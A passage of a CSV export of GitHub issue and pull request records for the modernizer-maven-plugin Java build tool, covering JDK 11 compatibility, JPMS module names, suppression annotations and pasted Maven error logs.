Improving this PR would probably take some time. I have some ideas, but I would like to check them with you first @gaul. Maybe lets split this. Accept the PR as is and open an issue to track the cleanup and missing test.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/99/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/99/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/99/events,https://github.com/gaul/modernizer-maven-plugin/pull/99,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/99
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/98,492239903,MDExOlB1bGxSZXF1ZXN0MzE2NDUwMjQ2,98,Update README.md,1205228,closed,FALSE,NA,NA,1,2019-09-11T13:30:49Z,2019-09-11T14:13:47Z,2019-09-11T14:13:38Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/98/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/98/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/98/events,https://github.com/gaul/modernizer-maven-plugin/pull/98,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/98
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/97,491338503,MDExOlB1bGxSZXF1ZXN0MzE1NzI1NTc0,97,Correct new JDK 11 API suggestions,513280,closed,FALSE,NA,NA,1,2019-09-09T21:34:18Z,2019-09-10T05:37:50Z,2019-09-09T22:55:39Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/97/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/97/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/97/events,https://github.com/gaul/modernizer-maven-plugin/pull/97,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/97
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/96,487691875,MDExOlB1bGxSZXF1ZXN0MzEyOTAxMDU1,96,Add violations for JDK 11,848247,closed,FALSE,NA,NA,1,2019-08-30T22:28:27Z,2019-09-06T16:09:04Z,2019-09-06T16:08:29Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/96/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/96/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/96/events,https://github.com/gaul/modernizer-maven-plugin/pull/96,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/96
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/95,484173183,MDExOlB1bGxSZXF1ZXN0MzEwMTA4NDY4,95,Add JPMS module-info,3847030,closed,FALSE,NA,NA,1,2019-08-22T19:34:29Z,2019-08-22T20:18:27Z,2019-08-22T20:17:27Z,CONTRIBUTOR,NA,"This patch uses a combination of modulemaker-maven-plugin and
multi-release jar (JEP-238) to make modernizer-maven-annotations
a full JPMS module. For older JVM versions there is no impact,
as the class is not visible there.

Signed-off-by: Robert Varga <robert.varga@pantheon.tech>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/95/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/95/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/95/events,https://github.com/gaul/modernizer-maven-plugin/pull/95,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/95
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/94,484158598,MDExOlB1bGxSZXF1ZXN0MzEwMDk2NTk0,94,Add Automatic-Module-Name header,3847030,closed,FALSE,NA,NA,2,2019-08-22T18:58:53Z,2019-08-22T19:14:42Z,2019-08-22T19:10:26Z,CONTRIBUTOR,NA,"This names modernizer-maven-annotations, so it can be used as
a dependency in JMPS. This fixes #93.

Signed-off-by: Robert Varga <robert.varga@pantheon.tech>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/94/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/94/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/94/events,https://github.com/gaul/modernizer-maven-plugin/pull/94,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/94
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/93,484142616,MDU6SXNzdWU0ODQxNDI2MTY=,93,Add Automatic-Module-Name to annotations,3847030,closed,FALSE,NA,NA,1,2019-08-22T18:20:40Z,2019-08-22T19:10:26Z,2019-08-22T19:10:26Z,CONTRIBUTOR,NA,"Since the annotations module does not commit to a JPMS module name, one cannot use it with in artifacts which want to be full JMPS modules, because:

> [INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ util ---
[WARNING] **************************************************************************************************************************************************************
[WARNING] * Required filename-based automodules detected: [modernizer-maven-annotations-1.8.0.jar]. Please don't publish this project to a public artifact repository! *
[WARNING] **************************************************************************************************************************************************************

It would be nice to get a release which would contain a Automatic-Module-Name entry, thus other artifacts can properly reference it.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/93/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/93/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/93/events,https://github.com/gaul/modernizer-maven-plugin/issues/93,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/92,455384024,MDU6SXNzdWU0NTUzODQwMjQ=,92,JDK compatibility,848247,open,FALSE,NA,NA,4,2019-06-12T19:25:55Z,2020-01-30T04:06:40Z,NA,OWNER,NA,"Travis using JDK 11 recently failed:

https://travis-ci.org/gaul/modernizer-maven-plugin/builds/544727117

this is due to Travis upgrading from JDK 8:

https://travis-ci.org/gaul/modernizer-maven-plugin/builds/544212234

Newer JDKs remove `sun.misc.BASE64Decoder` and `sun.misc.BASE64Encoder` which the unit tests reference.  Modernizer only requires JDK 7 but this will become an issue for developers at some point.  Perhaps remove the problematic APIs from the unit tests?",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/92/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/92/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/92/events,https://github.com/gaul/modernizer-maven-plugin/issues/92,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/91,449114457,MDU6SXNzdWU0NDkxMTQ0NTc=,91, Allow Matcher.appendReplacement for StringBuffer in JDK <= 8.,5593198,closed,FALSE,NA,NA,10,2019-05-28T07:49:37Z,2019-05-28T08:44:12Z,2019-05-28T08:44:12Z,NONE,NA," Allow Matcher.appendReplacement for StringBuffer in JDK <= 8.

The API for Matcher.appendReplacement for StringBuilder has been added in JDK 9.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/91/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/91/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/91/events,https://github.com/gaul/modernizer-maven-plugin/issues/91,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/90,415946206,MDExOlB1bGxSZXF1ZXN0MjU3MzIzMDgy,90,fix link problem in README,56830,closed,FALSE,NA,NA,1,2019-03-01T05:20:37Z,2019-03-01T05:30:23Z,2019-03-01T05:30:14Z,NONE,NA,"The link is broken, I guess this is the correct one. ",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/90/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/90/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/90/events,https://github.com/gaul/modernizer-maven-plugin/pull/90,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/90
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/89,408972273,MDExOlB1bGxSZXF1ZXN0MjUyMDYxMjg2,89,"For Java 9+, flag usages of `Preconditions.{checkElementIndex,checkPositionIndexes}`",513280,closed,FALSE,NA,NA,3,2019-02-11T20:56:41Z,2019-02-12T05:48:43Z,2019-02-11T23:30:23Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/89/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/89/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/89/events,https://github.com/gaul/modernizer-maven-plugin/pull/89,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/89
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/88,408568076,MDExOlB1bGxSZXF1ZXN0MjUxNzU4OTU2,88,"For Java 9+, flag usages of `MoreObjects.firstNonNull`",513280,closed,FALSE,NA,NA,2,2019-02-10T19:14:50Z,2019-02-10T19:24:47Z,2019-02-10T19:22:44Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/88/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/88/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/88/events,https://github.com/gaul/modernizer-maven-plugin/pull/88,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/88
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/87,408541375,MDExOlB1bGxSZXF1ZXN0MjUxNzQyNTcx,87,"For Java 9+, flag usages of `Iterators.forEnumeration`",513280,closed,FALSE,NA,NA,2,2019-02-10T14:39:08Z,2019-02-10T18:52:39Z,2019-02-10T18:37:40Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/87/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/87/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/87/events,https://github.com/gaul/modernizer-maven-plugin/pull/87,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/87
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/86,403278244,MDExOlB1bGxSZXF1ZXN0MjQ3NzcwMjgw,86,Add @SuppressModernizer,3606665,closed,FALSE,NA,NA,8,2019-01-25T18:35:47Z,2019-02-04T14:48:30Z,2019-02-01T19:57:06Z,CONTRIBUTOR,NA,"This add `@SuppressModernizer` to fix https://github.com/gaul/modernizer-maven-plugin/issues/3. I can update the docs once this approach is approved.

@gaul 
cc @jhaber @kmclarnon

",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/86/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/86/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/86/events,https://github.com/gaul/modernizer-maven-plugin/pull/86,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/86
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/85,403144084,MDExOlB1bGxSZXF1ZXN0MjQ3NjY1MDY4,85,"For Java 9+, flag usages of `Streams.stream(Optional*)`",513280,closed,FALSE,NA,NA,1,2019-01-25T12:48:05Z,2019-01-26T00:04:12Z,2019-01-25T17:35:53Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/85/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/85/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/85/events,https://github.com/gaul/modernizer-maven-plugin/pull/85,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/85
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/84,398832174,MDExOlB1bGxSZXF1ZXN0MjQ0Mzk5ODAw,84,Don't check javaVersion when execution is skipped,1206309,closed,FALSE,NA,NA,0,2019-01-14T10:43:09Z,2019-01-14T18:14:48Z,2019-01-14T18:14:48Z,CONTRIBUTOR,NA,This fixes #83 ,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/84/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/84/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/84/events,https://github.com/gaul/modernizer-maven-plugin/pull/84,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/84
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/83,397258787,MDU6SXNzdWUzOTcyNTg3ODc=,83,Don't check modernizer.javaVersion when execution is skipped,1206309,closed,FALSE,NA,NA,2,2019-01-09T08:23:19Z,2019-01-14T18:14:48Z,2019-01-14T18:14:48Z,CONTRIBUTOR,NA,When the execution of this plugin is skipped the plugin should not complain that the javaVersion is not specified.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/83/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/83/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/83/events,https://github.com/gaul/modernizer-maven-plugin/issues/83,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/82,384027389,MDExOlB1bGxSZXF1ZXN0MjMzMzQzNjk1,82,Fix asm Opcodes version,381887,closed,FALSE,NA,NA,1,2018-11-24T22:26:05Z,2018-11-24T22:33:21Z,2018-11-24T22:29:30Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/82/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/82/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/82/events,https://github.com/gaul/modernizer-maven-plugin/pull/82,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/82
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/81,379408584,MDU6SXNzdWUzNzk0MDg1ODQ=,81,1.7.0 still not working on java 11,18299,closed,FALSE,NA,NA,6,2018-11-10T09:52:21Z,2018-12-03T02:30:34Z,2018-12-03T02:30:34Z,NONE,NA,"```
[DEBUG] Populating class realm plugin>org.gaul:modernizer-maven-plugin:1.7.0
[DEBUG]   Included: org.gaul:modernizer-maven-plugin:jar:1.7.0
[DEBUG]   Included: org.codehaus.plexus:plexus-utils:jar:1.5.1
[DEBUG]   Included: junit:junit:jar:3.8.1
[DEBUG]   Included: org.ow2.asm:asm:jar:7.0
[DEBUG]   Included: org.ow2.asm:asm-commons:jar:7.0
[DEBUG]   Included: org.ow2.asm:asm-tree:jar:7.0
[DEBUG]   Included: org.ow2.asm:asm-analysis:jar:7.0
[DEBUG] Configuring mojo org.gaul:modernizer-maven-plugin:1.7.0:modernizer from plugin realm ClassRealm[plugin>org.gaul:modernizer-maven-plugin:1.7.0, parent: jdk.inte
rnal.loader.ClassLoaders$AppClassLoader@799f7e29]
[DEBUG] Configuring mojo 'org.gaul:modernizer-maven-plugin:1.7.0:modernizer' with basic configurator -->
[DEBUG]   (f) failOnViolations = true
[DEBUG]   (f) includeTestClasses = true
[DEBUG]   (f) javaVersion = 11
[DEBUG]   (f) outputDirectory = /Users/et2448/projects/tac/jfr/tac-jfr-server/jfr-srv-schemas/target/classes
[DEBUG]   (f) project = MavenProject: com.edb.fs.tac.jfr.srv:jfr-srv-schemas:7.0.0-SNAPSHOT @ /Users/et2448/projects/tac/jfr/tac-jfr-server/jfr-srv-schemas/pom.xml
[DEBUG]   (f) skip = false
[DEBUG]   (f) sourceDirectory = /Users/et2448/projects/tac/jfr/tac-jfr-server/jfr-srv-schemas/src/main/java
[DEBUG]   (f) testOutputDirectory = /Users/et2448/projects/tac/jfr/tac-jfr-server/jfr-srv-schemas/target/test-classes
[DEBUG]   (f) testSourceDirectory = /Users/et2448/projects/tac/jfr/tac-jfr-server/jfr-srv-schemas/src/test/java
[DEBUG]   (f) violationLogLevel = error
[DEBUG]   (f) violationsFiles = []
[DEBUG] -- end configuration --
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  24.976 s (Wall Clock)
[INFO] Finished at: 2018-11-10T10:47:51+01:00
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.gaul:modernizer-maven-plugin:1.7.0:modernizer (modernizer) on project jfr-srv-schemas: Execution modernizer of goal org.gaul:moderni
zer-maven-plugin:1.7.0:modernizer failed: This feature requires ASM7 -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.gaul:modernizer-maven-plugin:1.7.0:modernizer (modernizer) on project jfr-srv-schema
s: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.7.0:modernizer failed: This feature requires ASM7
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:215)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:515)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1128)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:628)
    at java.lang.Thread.run (Thread.java:834)
Caused by: org.apache.maven.plugin.PluginExecutionException: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.7.0:modernizer failed: This feature requires ASM7
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:148)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:210)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)
```",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/81/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/81/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/81/events,https://github.com/gaul/modernizer-maven-plugin/issues/81,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/80,377243136,MDU6SXNzdWUzNzcyNDMxMzY=,80,Android violations,848247,open,FALSE,NA,NA,0,2018-11-05T04:04:09Z,2018-11-05T04:04:09Z,NA,OWNER,NA,The Android API is quite large and changed over time; I wonder if modernizer can help people keep up with the latest versions?  We would need a separate version field for this.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/80/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/80/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/80/events,https://github.com/gaul/modernizer-maven-plugin/issues/80,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/79,376553837,MDU6SXNzdWUzNzY1NTM4Mzc=,79,"""java.version"" to Runtime.version()",1894657,closed,FALSE,NA,NA,2,2018-11-01T20:17:56Z,2019-08-22T19:08:33Z,2019-08-22T19:08:32Z,NONE,NA,"[Runtime.version](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/Runtime.html#version()) was added in 9. Is it possible for modernizer to recognize this update flow?

```java
System.getProperty(""java.version"")
Runtime.version().major()
```

```
jshell
|  Welcome to JShell -- Version 11
|  For an introduction type: /help intro

jshell> System.getProperty(""java.version"")
$1 ==> ""11""

jshell> Runtime.version().major();
$2 ==> 11
```",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/79/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/79/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/79/events,https://github.com/gaul/modernizer-maven-plugin/issues/79,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/78,367922361,MDExOlB1bGxSZXF1ZXN0MjIxMjE5NTMy,78,Add violations for Guava NavigableMap/Set methods,557519,closed,FALSE,NA,NA,1,2018-10-08T19:27:18Z,2018-10-08T19:51:15Z,2018-10-08T19:51:05Z,CONTRIBUTOR,NA,"Since Java 8 there are java.util.Collections alternatives for
* unmodifiableNavigableMap
* synchronizedNavigableMap
* unmodifiableNavigableSet
* synchronizedNavigableSet",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/78/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/78/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/78/events,https://github.com/gaul/modernizer-maven-plugin/pull/78,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/78
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/77,365739021,MDExOlB1bGxSZXF1ZXN0MjE5NTg0Mjcz,77,Allow comments in exclusion file,557519,closed,FALSE,NA,NA,1,2018-10-02T04:43:29Z,2018-10-02T05:34:17Z,2018-10-02T05:34:03Z,CONTRIBUTOR,NA,"Empty lines and lines starting with `#` will be ignored.

Fixes #27",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/77/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/77/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/77/events,https://github.com/gaul/modernizer-maven-plugin/pull/77,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/77
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/76,365278809,MDU6SXNzdWUzNjUyNzg4MDk=,76,java 11 support,18299,closed,FALSE,NA,NA,3,2018-10-01T00:55:49Z,2018-10-27T23:07:32Z,2018-10-27T23:07:32Z,NONE,NA,"The plugin fails with java11:

```
[ERROR] Failed to execute goal org.gaul:modernizer-maven-plugin:1.7.0-SNAPSHOT:modernizer (modernizer) on project jfr-srv-common: Execution modernizer of goal org.gaul
:modernizer-maven-plugin:1.7.0-SNAPSHOT:modernizer failed: Unsupported class file major version 55 -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.gaul:modernizer-maven-plugin:1.7.0-SNAPSHOT:modernizer (modernizer) on project jfr-s
rv-common: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.7.0-SNAPSHOT:modernizer failed: Unsupported class file major version 55
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:154)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:146)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:515)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1128)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:628)
    at java.lang.Thread.run (Thread.java:834)
Caused by: org.apache.maven.plugin.PluginExecutionException: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.7.0-SNAPSHOT:modernizer failed: Unsupporte
d class file major version 55
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:148)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:208)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:154)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:146)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
    at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:515)
    at java.util.concurrent.FutureTask.run (FutureTask.java:264)
    at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1128)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:628)
    at java.lang.Thread.run (Thread.java:834)
Caused by: java.lang.IllegalArgumentException: Unsupported class file major version 55
    at org.objectweb.asm.ClassReader.<init> (ClassReader.java:166)
    at org.objectweb.asm.ClassReader.<init> (ClassReader.java:148)
    at org.objectweb.asm.ClassReader.<init> (ClassReader.java:136)
    at org.objectweb.asm.ClassReader.<init> (ClassReader.java:237)
    at org.gaul.modernizer_maven_plugin.Modernizer.check (Modernizer.java:84)
    at wsdlvalidator -verbose /privaorg.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:311)
    at org.gaul.modernizer_maven_plugin.te/var/folders/cModernizerMojo.recurseFiles (ModernizerMojo.java:304)
    at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:304)
    at org.gaul.moderni7/18m1hlzs075_z0f5nfnt44jm0000gn/T/wsfabric120850ze09627699578934tmp
```",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/76/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/76/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/76/events,https://github.com/gaul/modernizer-maven-plugin/issues/76,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/75,324696876,MDExOlB1bGxSZXF1ZXN0MTg5MjI2Nzk2,75,Remove violations for Guava WithExpectedSize methods,557519,closed,FALSE,NA,NA,1,2018-05-20T09:49:20Z,2018-08-02T00:25:14Z,2018-08-02T00:24:32Z,CONTRIBUTOR,NA,"The recommended replacement constructors take in initialCapacity (with default loadFactor), not expected size. To avoid reallocating and copying the internal array the expected size must be converted to an
initial capacity, like the Guava methods does.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/75/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/75/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/75/events,https://github.com/gaul/modernizer-maven-plugin/pull/75,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/75
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/74,310496453,MDExOlB1bGxSZXF1ZXN0MTc4ODQ3Nzcz,74,Enable SuppressWarnings annotation,13430900,closed,FALSE,NA,NA,6,2018-04-02T14:15:42Z,2019-01-30T06:36:44Z,2019-01-30T06:36:44Z,NONE,NA,"Addresses https://github.com/gaul/modernizer-maven-plugin/issues/3

This PR allows users to suppress modernizer errors by adding `@SuppressWarnings(""modernizer"")` at class/method level.

@gaul 
cc @jhaber @stevegutz

---
How can a user suppress modernizer warnings?

`modernizer-annotation-processor` should be added as a provided-scoped dependency in the project.
Any class or method can be annotated with `@SuppressWarnings(""modernizer"")` to suppress all modernizer errors
in that block of code.

## Implementation strategy

1. The code base has been organized into 3 modules:
   1. `modernizer-maven-plugin` has the main plugin code.
   2. `modernizer-maven-policy` has checkstyle rules and is added as a dependency to `maven-checkstyle-plugin`
   in the plugin's pom.
   3. `modernizer-annotation-processor` has annotation processing code and is added as a dependency in plugin.
2. When a project is run, before compiling the source code in the project, annotation processor scans to see if there are any
   methods/classes annotated as `@SuppressWarnings(""modernizer"")`. These annotations can be added to methods or classes.
   1. If the annotation is on a class, the processor constructs a regex that matches the fully qualified class name of the
   annotated class and its subclasses.
